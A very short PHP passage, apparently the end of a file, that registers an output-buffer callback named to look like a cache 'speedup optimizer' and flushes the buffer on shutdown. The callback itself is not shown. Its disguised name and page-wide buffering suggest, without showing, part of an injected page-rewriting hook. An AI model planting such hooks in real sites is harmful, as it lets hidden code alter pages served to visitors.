} ob_start('_php_cache_speedup_func_optimizer_');
register_shutdown_function('ob_end_flush'); }
?>
